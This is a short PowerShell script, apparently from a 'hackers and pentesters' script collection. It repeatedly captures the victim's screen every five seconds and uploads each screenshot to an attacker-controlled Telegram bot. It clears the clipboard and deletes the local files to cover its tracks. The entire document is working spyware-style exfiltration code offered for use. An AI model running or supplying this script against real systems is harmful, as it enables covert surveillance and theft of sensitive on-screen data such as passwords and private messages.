## Take and send screenshot using Powershell with Telebot
### For more info visit https://github.com/Whitecat18/Powershell-Scripts-for-Hackers-and-Pentesters/

# Download the module 
Install-Module -Name Telegram.Bot -Scope CurrentUser

# Program Starts Here
Import-Module Telegram.Bot

$botToken = 'YOUR_BOT_TOKEN'
$botApiUrl = "https://api.telegram.org/bot$botToken"

$screenshotInterval = 5  
$totalDuration = 100
$numScreenshots = [math]::Floor($totalDuration / $screenshotInterval)

function CaptureAndSendScreenshot {
    $screenshotPath = Join-Path $env:TEMP "Screenshot_$((Get-Date).ToString('yyyyMMddHHmmss')).png"
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.SendKeys]::SendWait('^{PRTSC}')
    Start-Sleep -Seconds 1
    $image = [System.Windows.Forms.Clipboard]::GetImage()
    $image.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
    [System.Windows.Forms.Clipboard]::Clear()
    return $screenshotPath
}

function SendScreenshotToTelegram ($screenshotPath) {
    $botApiMethod = 'sendPhoto'
    $chatId = 'YOUR_CHAT_ID'  
    $photoParam = @{
        chat_id = $chatId
        photo = [System.IO.File]::OpenRead($screenshotPath)
    }

    Invoke-RestMethod -Uri "$botApiUrl/$botApiMethod" -Method POST -InFile $screenshotPath -ContentType 'multipart/form-data' -Body $photoParam
    Remove-Item -Path $screenshotPath
}

# Main loop to capture and send screenshots
for ($i = 0; $i -lt $numScreenshots; $i++) {
    $screenshotPath = CaptureAndSendScreenshot
    SendScreenshotToTelegram $screenshotPath
    Start-Sleep -Seconds $screenshotInterval
}
